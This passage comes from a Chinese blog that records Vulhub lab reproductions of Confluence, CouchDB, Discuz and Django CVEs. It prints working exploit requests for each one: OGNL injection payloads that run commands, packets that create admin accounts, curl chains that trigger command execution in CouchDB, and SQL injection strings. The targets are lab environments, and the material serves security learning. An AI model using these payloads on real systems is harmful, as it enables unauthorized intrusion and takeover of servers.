x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Referer: http://192.168.1.162:8090/template/custom/content-editor.vmAccept-Encoding: gzip, deflateAccept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7Cookie: JSESSIONID=7B35600F54A9E303CE8C277ED960E1E7; seraph.confluence=524289%3A2ac32a308478b9cb9f0e351a12470faa4f2a928aConnection: close<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h1 id="Confluence-OGNL表达式注入命令执行漏洞（CVE-2022-26134）"><a href="#Confluence-OGNL表达式注入命令执行漏洞（CVE-2022-26134）" class="headerlink" title="Confluence OGNL表达式注入命令执行漏洞（CVE-2022-26134）"></a>Confluence OGNL表达式注入命令执行漏洞（CVE-2022-26134）</h1><blockquote><p>Atlassian Confluence是企业广泛使用的wiki系统。2022年6月2日Atlassian官方发布了一则安全更新，通告了一个严重且已在野利用的代码执行漏洞，攻击者利用这个漏洞即可无需任何条件在Confluence中执行任意命令。</p><p>参考链接：</p><ul><li><a href="https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html">https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html</a></li><li><a href="https://attackerkb.com/topics/BH1D56ZEhs/cve-2022-26134/rapid7-analysis">https://attackerkb.com/topics/BH1D56ZEhs/cve-2022-26134/rapid7-analysis</a></li></ul></blockquote><h2 id="漏洞复现-22"><a href="#漏洞复现-22" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>该漏洞利用方法十分简单，直接发送如下请求即可执行任意命令，并在HTTP返回头中获取执行结果：</p><pre class="line-numbers language-none"><code class="language-none">GET /%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/ HTTP/1.1Host: your-ip:8090Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36Connection: close<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/60.jpg" alt="60"></p><h1 id="Confluence-属性覆盖导致权限绕过漏洞-CVE-2023-22515"><a href="#Confluence-属性覆盖导致权限绕过漏洞-CVE-2023-22515" class="headerlink" title="Confluence 属性覆盖导致权限绕过漏洞 (CVE-2023-22515)"></a>Confluence 属性覆盖导致权限绕过漏洞 (CVE-2023-22515)</h1><blockquote><p>Atlassian Confluence是企业广泛使用的wiki系统。</p><p>2023年10月4日，Atlassian官方发布了对于CVE-2023-22515漏洞的补丁。这个漏洞是由属性覆盖导致，利用该漏洞攻击者可以重新执行Confluence安装流程并增加管理员账户。</p><p>该漏洞不影响8.0.0以前的版本。</p><p>参考链接：</p><ul><li><a href="https://confluence.atlassian.com/security/cve-2023-22515-privilege-escalation-vulnerability-in-confluence-data-center-and-server-1295682276.html">https://confluence.atlassian.com/security/cve-2023-22515-privilege-escalation-vulnerability-in-confluence-data-center-and-server-1295682276.html</a></li><li><a href="https://attackerkb.com/topics/Q5f0ItSzw5/cve-2023-22515/rapid7-analysis">https://attackerkb.com/topics/Q5f0ItSzw5/cve-2023-22515/rapid7-analysis</a></li></ul></blockquote><h2 id="漏洞复现-23"><a href="#漏洞复现-23" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>首先，最主要的请求就是覆盖目标Confluence服务器中的<code>bootstrapStatusProvider.applicationConfig.setupComplete</code>属性：</p><pre class="line-numbers language-none"><code class="language-none">GET /server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false HTTP/1.1Host: localhost:8090Accept-Encoding: gzip, deflate, brAccept: */*Accept-Language: en-US;q=0.9,en;q=0.8User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36Connection: closeCache-Control: max-age=0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后，你就可以使用如下请求创建一个新的管理员账户<code>vulhub</code>：</p><pre class="line-numbers language-none"><code class="language-none">POST /setup/setupadministrator.action HTTP/1.1Host: localhost:8090Accept-Encoding: gzip, deflate, brAccept: */*Accept-Language: en-US;q=0.9,en;q=0.8User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36Connection: closeCache-Control: max-age=0Content-Type: application/x-www-form-urlencodedContent-Length: 110X-Atlassian-Token: no-checkusername=vulhub&amp;fullName=vulhub&amp;email=admin%40vulhub.org&amp;password=vulhub&amp;confirm=vulhub&amp;setup-next-button=Next<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>发送如下请求完成安装步骤：</p><pre class="line-numbers language-none"><code class="language-none">POST /setup/finishsetup.action HTTP/1.1Host: localhost:8090Accept-Encoding: gzip, deflate, brAccept: */*Accept-Language: en-US;q=0.9,en;q=0.8User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36Connection: closeCache-Control: max-age=0Content-Type: application/x-www-form-urlencodedContent-Length: 0X-Atlassian-Token: no-check<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后，直接使用新的<code>vulhub</code>账户（密码同样是<code>vulhub</code>）来登录Confluence，可见新的管理员已成功增加：</p></blockquote><p>老卡在第一步…没成功</p><h1 id="Confluence-OGNL表达式注入命令执行漏洞（CVE-2023-22527）"><a href="#Confluence-OGNL表达式注入命令执行漏洞（CVE-2023-22527）" class="headerlink" title="Confluence OGNL表达式注入命令执行漏洞（CVE-2023-22527）"></a>Confluence OGNL表达式注入命令执行漏洞（CVE-2023-22527）</h1><blockquote><p>Atlassian Confluence是企业广泛使用的wiki系统。</p><p>在Confluence 8.0到8.5.3版本之间，存在一处由于任意velocity模板被调用导致的OGNL表达式注入漏洞，未授权攻击者利用该漏洞可以直接攻击Confluence服务器并执行任意命令。</p><p>参考链接：</p><ul><li><a href="https://confluence.atlassian.com/security/cve-2023-22527-rce-remote-code-execution-vulnerability-in-confluence-data-center-and-confluence-server-1333990257.html">https://confluence.atlassian.com/security/cve-2023-22527-rce-remote-code-execution-vulnerability-in-confluence-data-center-and-confluence-server-1333990257.html</a></li><li><a href="https://blog.projectdiscovery.io/atlassian-confluence-ssti-remote-code-execution/">https://blog.projectdiscovery.io/atlassian-confluence-ssti-remote-code-execution/</a></li></ul></blockquote><h2 id="漏洞复现-24"><a href="#漏洞复现-24" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><h2 id="漏洞复现-25"><a href="#漏洞复现-25" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>该漏洞利用方法十分简单，直接发送如下请求即可执行任意命令，并在HTTP返回头中获取执行结果：</p><pre class="line-numbers language-none"><code class="language-none">POST /template/aui/text-inline.vm HTTP/1.1Host: localhost:8090Accept-Encoding: gzip, deflate, brAccept: */*Accept-Language: en-US;q=0.9,en;q=0.8User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36Connection: closeCache-Control: max-age=0Content-Type: application/x-www-form-urlencodedContent-Length: 285label=\u0027%2b#request\u005b\u0027.KEY_velocity.struts2.context\u0027\u005d.internalGet(\u0027ognl\u0027).findValue(#parameters.x,{})%2b\u0027&amp;x=@org.apache.struts2.ServletActionContext@getResponse().setHeader('X-Cmd-Response',(new freemarker.template.utility.Execute()).exec({"id"}))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/61.jpg" alt="61"></p><h1 id="Couchdb-垂直权限绕过漏洞（CVE-2017-12635）"><a href="#Couchdb-垂直权限绕过漏洞（CVE-2017-12635）" class="headerlink" title="Couchdb 垂直权限绕过漏洞（CVE-2017-12635）"></a>Couchdb 垂直权限绕过漏洞（CVE-2017-12635）</h1><blockquote><h1 id="Couchdb-垂直权限绕过漏洞（CVE-2017-12635）-1"><a href="#Couchdb-垂直权限绕过漏洞（CVE-2017-12635）-1" class="headerlink" title="Couchdb 垂直权限绕过漏洞（CVE-2017-12635）"></a>Couchdb 垂直权限绕过漏洞（CVE-2017-12635）</h1><p>Apache CouchDB是一个开源数据库，专注于易用性和成为”完全拥抱web的数据库”。它是一个使用JSON作为存储格式，JavaScript作为查询语言，MapReduce和HTTP作为API的NoSQL数据库。应用广泛，如BBC用在其动态内容展示平台，Credit Suisse用在其内部的商品部门的市场框架，Meebo，用在其社交平台（web和应用程序）。</p><p>在2017年11月15日，CVE-2017-12635和CVE-2017-12636披露，CVE-2017-12635是由于Erlang和JavaScript对JSON解析方式的不同，导致语句执行产生差异性导致的。这个漏洞可以让任意用户创建管理员，属于垂直权限绕过漏洞。</p><p>影响版本：小于 1.7.0 以及 小于 2.1.1</p><p>参考链接：</p><ul><li><a href="http://bobao.360.cn/learning/detail/4716.html">http://bobao.360.cn/learning/detail/4716.html</a></li><li><a href="https://justi.cz/security/2017/11/14/couchdb-rce-npm.html">https://justi.cz/security/2017/11/14/couchdb-rce-npm.html</a></li></ul></blockquote><h2 id="漏洞复现-26"><a href="#漏洞复现-26" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>首先，发送如下数据包：</p></blockquote><pre class="line-numbers language-none"><code class="language-none">PUT /_users/org.couchdb.user:vulhub HTTP/1.1Host: your-ip:5984Accept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: application/jsonContent-Length: 90{  "type": "user",  "name": "vulhub",  "roles": ["_admin"],  "password": "vulhub"}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可见，返回403错误：<code>{"error":"forbidden","reason":"Only _admin may set roles"}</code>，只有管理员才能设置Role角色：</p><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/62.jpg" alt="62"></p><blockquote><p>发送包含两个roles的数据包，即可绕过限制：</p><pre class="line-numbers language-none"><code class="language-none">PUT /_users/org.couchdb.user:vulhub HTTP/1.1Host: your-ip:5984Accept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: application/jsonContent-Length: 108{  "type": "user",  "name": "vulhub",  "roles": ["_admin"],  "roles": [],  "password": "vulhub"}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>成功创建管理员，账户密码均为<code>vulhub</code>：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/63.jpg" alt="63"></p><blockquote><p>再次访问<code>http://your-ip:5984/_utils/</code>，输入账户密码<code>vulhub</code>，可以成功登录：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/64.jpg" alt="64"></p><h1 id="Couchdb-任意命令执行漏洞（CVE-2017-12636）"><a href="#Couchdb-任意命令执行漏洞（CVE-2017-12636）" class="headerlink" title="Couchdb 任意命令执行漏洞（CVE-2017-12636）"></a>Couchdb 任意命令执行漏洞（CVE-2017-12636）</h1><blockquote><p>Apache CouchDB是一个开源数据库，专注于易用性和成为”完全拥抱web的数据库”。它是一个使用JSON作为存储格式，JavaScript作为查询语言，MapReduce和HTTP作为API的NoSQL数据库。应用广泛，如BBC用在其动态内容展示平台，Credit Suisse用在其内部的商品部门的市场框架，Meebo，用在其社交平台（web和应用程序）。</p><p>在2017年11月15日，CVE-2017-12635和CVE-2017-12636披露，CVE-2017-12636是一个任意命令执行漏洞，我们可以通过config api修改couchdb的配置<code>query_server</code>，这个配置项在设计、执行view的时候将被运行。</p><p>影响版本：小于 1.7.0 以及 小于 2.1.1</p><p>参考链接：</p><ul><li><a href="http://bobao.360.cn/learning/detail/4716.html">http://bobao.360.cn/learning/detail/4716.html</a></li><li><a href="https://justi.cz/security/2017/11/14/couchdb-rce-npm.html">https://justi.cz/security/2017/11/14/couchdb-rce-npm.html</a></li></ul></blockquote><h2 id="漏洞复现-27"><a href="#漏洞复现-27" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>该漏洞是需要登录用户方可触发，如果不知道目标管理员密码，可以利用<a href="https://github.com/vulhub/vulhub/tree/master/couchdb/CVE-2017-12635">CVE-2017-12635</a>先增加一个管理员用户。</p><blockquote><p> 1.6.0 下的说明</p><p>依次执行如下请求即可触发任意命令执行：</p><pre class="line-numbers language-none"><code class="language-none">curl -X PUT 'http://vulhub:vulhub@127.0.0.1:5984/_config/query_servers/cmd' -d '"id &gt;/tmp/success"'curl -X PUT 'http://vulhub:vulhub@127.0.0.1:5984/vultest'curl -X PUT 'http://vulhub:vulhub@127.0.0.1:5984/vultest/vul' -d '{"_id":"770895a97726d5ca6d70a22173005c7b"}'curl -X POST 'http://vulhub:vulhub@127.0.0.1:5984/vultest/_temp_view?limit=10' -d '{"language":"cmd","map":""}' -H 'Content-Type:application/json'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>其中,<code>vulhub:vulhub</code>为管理员账号密码。</p><p>第一个请求是添加一个名字为<code>cmd</code>的<code>query_servers</code>，其值为<code>"id &gt;/tmp/success"</code>，这就是我们后面待执行的命令。</p><p>第二、三个请求是添加一个Database和Document，这里添加了后面才能查询。</p><p>第四个请求就是在这个Database里进行查询，因为我将language设置为<code>cmd</code>，这里就会用到我第一步里添加的名为<code>cmd</code>的<code>query_servers</code>，最后触发命令执行。</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/65.jpg" alt="65"></p><h1 id="CouchDB-Erlang-分布式协议代码执行-CVE-2022-24706"><a href="#CouchDB-Erlang-分布式协议代码执行-CVE-2022-24706" class="headerlink" title="CouchDB Erlang 分布式协议代码执行 (CVE-2022-24706)"></a>CouchDB Erlang 分布式协议代码执行 (CVE-2022-24706)</h1><blockquote><p>Apache CouchDB是一个Erlang开发的NoSQL数据库。</p><p>由于Erlang的特性，其支持分布式计算，分布式节点之间通过Erlang/OTP Distribution协议进行通信。攻击者如果知道通信时使用的Cookie，即可在握手包通过认证并执行任意命令。</p><p>在CouchDB 3.2.1及以前版本中，使用了默认Cookie，值为“monster”。</p><p>参考链接：</p><ul><li><a href="https://docs.couchdb.org/en/3.2.2-docs/cve/2022-24706.html">https://docs.couchdb.org/en/3.2.2-docs/cve/2022-24706.html</a></li><li><a href="https://insinuator.net/2017/10/erlang-distribution-rce-and-a-cookie-bruteforcer/">https://insinuator.net/2017/10/erlang-distribution-rce-and-a-cookie-bruteforcer/</a></li><li><a href="https://github.com/rapid7/metasploit-framework/blob/master//modules/exploits/multi/misc/erlang_cookie_rce.rb">https://github.com/rapid7/metasploit-framework/blob/master//modules/exploits/multi/misc/erlang_cookie_rce.rb</a></li><li><a href="https://github.com/sadshade/CVE-2022-24706-CouchDB-Exploit">https://github.com/sadshade/CVE-2022-24706-CouchDB-Exploit</a></li></ul></blockquote><h2 id="漏洞复现-28"><a href="#漏洞复现-28" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>我们可以使用<a href="">这个POC</a>来利用本漏洞。这个POC会先通过目标的4369端口epmd服务获取集群通信的端口，也就是9100，然后再使用默认Cookie来控制节点执行任意命令。</p><pre class="line-numbers language-none"><code class="language-none">&gt;python poc.py target-ip 4369<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/66.jpg" alt="66"></p><h1 id="Discuz-7-x-6-x-全局变量防御绕过导致代码执行"><a href="#Discuz-7-x-6-x-全局变量防御绕过导致代码执行" class="headerlink" title="Discuz 7.x/6.x 全局变量防御绕过导致代码执行"></a>Discuz 7.x/6.x 全局变量防御绕过导致代码执行</h1><blockquote><p>由于php5.3.x版本里php.ini的设置里<code>request_order</code>默认值为GP，导致<code>$_REQUEST</code>中不再包含<code>$_COOKIE</code>，我们通过在Cookie中传入<code>$GLOBALS</code>来覆盖全局变量，造成代码执行漏洞。</p><p>具体原理请参考：</p><ul><li><a href="https://www.secpulse.com/archives/2338.html">https://www.secpulse.com/archives/2338.html</a></li></ul></blockquote><h2 id="漏洞复现-29"><a href="#漏洞复现-29" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>安装成功后，直接找一个已存在的帖子，向其发送数据包，并在Cookie中增加<code>GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();</code>：</p><pre class="line-numbers language-none"><code class="language-none">GET /viewthread.php?tid=10&amp;extra=page%3D1 HTTP/1.1Host: your-ip:8080Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Cookie: GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();Connection: close<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可见，phpinfo已成功执行：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/67.jpg" alt="67"></p><h1 id="Django-debug-page-XSS漏洞（CVE-2017-12794）分析"><a href="#Django-debug-page-XSS漏洞（CVE-2017-12794）分析" class="headerlink" title="Django debug page XSS漏洞（CVE-2017-12794）分析"></a>Django debug page XSS漏洞（CVE-2017-12794）分析</h1><blockquote><p>Django发布了新版本1.11.5，修复了500页面中可能存在的一个XSS漏洞，这篇文章说明一下该漏洞的原理和复现，和我的一点点评。</p></blockquote><h2 id="漏洞复现-30"><a href="#漏洞复现-30" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>经过我的测试，我发现在使用Postgres数据库并触发异常的时候，psycopg2会将字段名和字段值全部抛出。那么，如果字段值中包含我们可控的字符串，又由于0x02中说到的，这个字符串其实就会被设置成<code>__cause__</code>，最后被显示在页面中。</p><p>所以我们假设有如下场景：</p><ol><li>用户注册页面，未检查用户名</li><li>注册一个用户名为<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>的用户</li><li>再次注册一个用户名为<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>的用户</li><li>触发duplicate key异常，导致XSS漏洞</li></ol><p>我将上述流程整理成vulhub的一个环境：<a href="https://github.com/phith0n/vulhub/tree/master/django/CVE-2017-12794">https://github.com/phith0n/vulhub/tree/master/django/CVE-2017-12794</a></p><p>编译及启动环境：</p><pre class="line-numbers language-none"><code class="language-none">&gt;docker compose up -d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>访问<code>http://your-ip:8000/create_user/?username=&lt;script&gt;alert(1)&lt;/script&gt;</code>创建一个用户，成功；再次访问<code>http://your-ip:8000/create_user/?username=&lt;script&gt;alert(1)&lt;/script&gt;</code>，触发异常：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/70.jpg" alt="70"><br><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/71.jpg" alt="71"></p><blockquote><p>可见，Postgres抛出的异常为</p><pre class="line-numbers language-none"><code class="language-none">duplicate key value violates unique constraint "xss_user_username_key"DETAIL:  Key (username)=(&lt;script&gt;alert(1)&lt;/script&gt;) already exists.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这个异常被拼接进<code>The above exception ({{ frame.exc_cause }}) was the direct cause of the following exception</code>，最后触发XSS。</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/72.jpg" alt="72"></p><h1 id="Django-2-0-8-任意URL跳转漏洞（CVE-2018-14574）"><a href="#Django-2-0-8-任意URL跳转漏洞（CVE-2018-14574）" class="headerlink" title="Django < 2.0.8 任意URL跳转漏洞（CVE-2018-14574）"></a>Django &lt; 2.0.8 任意URL跳转漏洞（CVE-2018-14574）</h1><blockquote><p>Django默认配置下，如果匹配上的URL路由中最后一位是/，而用户访问的时候没加/，Django默认会跳转到带/的请求中。（由配置项中的<code>django.middleware.common.CommonMiddleware</code>、<code>APPEND_SLASH</code>来决定）。</p><p>在path开头为<code>//example.com</code>的情况下，Django没做处理，导致浏览器认为目的地址是绝对路径，最终造成任意URL跳转漏洞。</p><p>该漏洞利用条件是目标<code>URLCONF</code>中存在能匹配上<code>//example.com</code>的规则。</p></blockquote><h2 id="漏洞复现-31"><a href="#漏洞复现-31" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>访问<code>http://your-ip:8000//www.example.com</code>，即可返回是301跳转到<code>//www.example.com/</code>：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/73.jpg" alt="73"></p><h1 id="Django-JSONField-HStoreField-SQL注入漏洞（CVE-2019-14234）"><a href="#Django-JSONField-HStoreField-SQL注入漏洞（CVE-2019-14234）" class="headerlink" title="Django JSONField/HStoreField SQL注入漏洞（CVE-2019-14234）"></a>Django JSONField/HStoreField SQL注入漏洞（CVE-2019-14234）</h1><blockquote><p>Django在2019年8月1日发布了一个安全更新，修复了在JSONField、HStoreField两个模型字段中存在的SQL注入漏洞。</p><p>参考链接：</p><ul><li><a href="https://www.djangoproject.com/weblog/2019/aug/01/security-releases/">https://www.djangoproject.com/weblog/2019/aug/01/security-releases/</a></li><li><a href="https://www.leavesongs.com/PENETRATION/django-jsonfield-cve-2019-14234.html">https://www.leavesongs.com/PENETRATION/django-jsonfield-cve-2019-14234.html</a></li></ul><p>该漏洞需要开发者使用了JSONField/HStoreField，且用户可控queryset查询时的键名，在键名的位置注入SQL语句。Django自带的后台应用Django-Admin中就存在这样的写法，我们可以直接借助它来复现漏洞。</p></blockquote><h2 id="漏洞复现-32"><a href="#漏洞复现-32" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>首先登陆后台<code>http://your-ip:8000/admin/</code>，用户名密码为<code>admin</code>、<code>a123123123</code>。</p><p>登陆后台后，进入模型<code>Collection</code>的管理页面<code>http://your-ip:8000/admin/vuln/collection/</code>：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/74.jpg" alt="74"></p><blockquote><p>然后在GET参数中构造<code>detail__a'b=123</code>提交，其中<code>detail</code>是模型<code>Collection</code>中的JSONField：</p><p><a href="http://your-ip:8000/admin/vuln/collection/?detail__a%27b=123">http://your-ip:8000/admin/vuln/collection/?detail__a%27b=123</a></p><p>可见，单引号已注入成功，SQL语句报错：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/75.jpg" alt="75"></p><h1 id="Django-GIS-SQL注入漏洞（CVE-2020-9402）"><a href="#Django-GIS-SQL注入漏洞（CVE-2020-9402）" class="headerlink" title="Django GIS SQL注入漏洞（CVE-2020-9402）"></a>Django GIS SQL注入漏洞（CVE-2020-9402）</h1><blockquote><p> Django在2020年3月4日发布了一个安全更新，修复了在GIS 查询功能中存在的SQL注入漏洞。</p><p>参考链接：</p><ul><li><a href="https://www.djangoproject.com/weblog/2020/mar/04/security-releases/">https://www.djangoproject.com/weblog/2020/mar/04/security-releases/</a></li></ul><p>该漏洞需要开发者使用了GIS中聚合查询的功能，用户在oracle的数据库且可控tolerance查询时的键名，在其位置注入SQL语句。</p></blockquote><h2 id="漏洞复现-33"><a href="#漏洞复现-33" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="漏洞一"><a href="#漏洞一" class="headerlink" title="漏洞一"></a>漏洞一</h3><blockquote><p>首先访问<code>http://your-ip:8000/vuln/</code>。</p><p>在该网页中使用<code>get</code>方法构造<code>q</code>的参数，构造SQL注入的字符串<code>20) = 1 OR (select utl_inaddr.get_host_name((SELECT version FROM v$instance)) from dual) is null  OR (1+1</code></p><p><a href="http://your-ip:8000/vuln/?q=20)%20=%201%20OR%20(select%20utl_inaddr.get_host_name((SELECT%20version%20FROM%20v$instance))%20from%20dual)%20is%20null%20%20OR%20">http://your-ip:8000/vuln/?q=20)%20%3D%201%20OR%20(select%20utl_inaddr.get_host_name((SELECT%20version%20FROM%20v%24instance))%20from%20dual)%20is%20null%20%20OR%20</a>(1%2B1</p><p>可见，括号已注入成功，SQL语句查询报错：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/76.jpg" alt="76"></p><h3 id="漏洞二"><a href="#漏洞二" class="headerlink" title="漏洞二"></a>漏洞二</h3><blockquote><p>访问<code>http://your-ip:8000/vuln2/</code>。<br>在该网页中使用<code>get</code>方法构造<code>q</code>的参数，构造出SQL注入的字符串<code>0.05))) FROM "VULN_COLLECTION2"  where  (select utl_inaddr.get_host_name((SELECT user FROM DUAL)) from dual) is not null  --</code></p><p><a href="http://your-ip:8000/vuln2/?q=0.05)))%20FROM%20%22VULN_COLLECTION2%22%20%20where%20%20(select%20utl_inaddr.get_host_name((SELECT%20user%20FROM%20DUAL))%20from%20dual)%20is%20not%20null%20%20--">http://your-ip:8000/vuln2/?q=0.05)))%20FROM%20%22VULN_COLLECTION2%22%20%20where%20%20(select%20utl_inaddr.get_host_name((SELECT%20user%20FROM%20DUAL))%20from%20dual)%20is%20not%20null%20%20--</a></p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/77.jpg" alt="77"></p><h1 id="Django-QuerySet-order-by-SQL注入漏洞（CVE-2021-35042）"><a href="#Django-QuerySet-order-by-SQL注入漏洞（CVE-2021-35042）" class="headerlink" title="Django QuerySet.order_by() SQL注入漏洞（CVE-2021-35042）"></a>Django QuerySet.order_by() SQL注入漏洞（CVE-2021-35042）</h1><blockquote><p>Django在2021年7月1日发布了一个安全更新，修复了在QuerySet底下的order_by函数中存在的SQL注入漏洞</p><p>参考链接:</p><ul><li><a href="https://www.djangoproject.com/weblog/2021/jul/01/security-releases/">https://www.djangoproject.com/weblog/2021/jul/01/security-releases/</a></li></ul><p>该漏洞需要用户可控order_by传入的值，在预期列的位置注入SQL语句。</p></blockquote><h2 id="漏洞复现-34"><a href="#漏洞复现-34" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p> 访问页面<code>http://your-ip:8000/vuln/</code>，在GET参数中构造<code>order=-id</code>，会得到根据id降序排列的结果：<br><code>http://your-ip:8000/vuln/?order=-id</code></p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/78.jpg" alt="78"></p><blockquote><p>再构造GET参数<code>order=vuln_collection.name);select updatexml(1, concat(0x7e,(select @@version)),1)%23</code>提交，其中<code>vuln_collection</code>是<code>vuln</code>应用下的模型<code>Collection</code></p><p><code>http://your-ip:8000/vuln/?order=vuln_collection.name);select updatexml(1, concat(0x7e,(select @@version)),1)%23</code></p><p>成功注入SQL语句，利用堆叠注入获得信息：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/79.jpg" alt="79"></p><h1 id="Django-Trunc-kind-and-Extract-lookup-name-SQL注入漏洞（CVE-2022-34265）"><a href="#Django-Trunc-kind-and-Extract-lookup-name-SQL注入漏洞（CVE-2022-34265）" class="headerlink" title="Django Trunc(kind) and Extract(lookup_name) SQL注入漏洞（CVE-2022-34265）"></a>Django Trunc(kind) and Extract(lookup_name) SQL注入漏洞（CVE-2022-34265）</h1><blockquote><p>Django在2022年7月4日发布了安全更新，修复了在数据库函数<code>Trunc()</code>和<code>Extract()</code>中存在的SQL注入漏洞。</p><p>参考链接：</p><ul><li><a href="https://www.djangoproject.com/weblog/2022/jul/04/security-releases/">https://www.djangoproject.com/weblog/2022/jul/04/security-releases/</a></li><li><a href="https://github.com/django/django/commit/0dc9c016fadb71a067e5a42be30164e3f96c0492">https://github.com/django/django/commit/0dc9c016fadb71a067e5a42be30164e3f96c0492</a></li></ul></blockquote><h2 id="漏洞复现-35"><a href="#漏洞复现-35" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>修改<code>date</code>参数即可复现SQL注入漏洞：</p><pre class="line-numbers language-none"><code class="language-none">http://your-ip:8000/?date=xxxx'xxxx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/80.jpg" alt="80"></p><h1 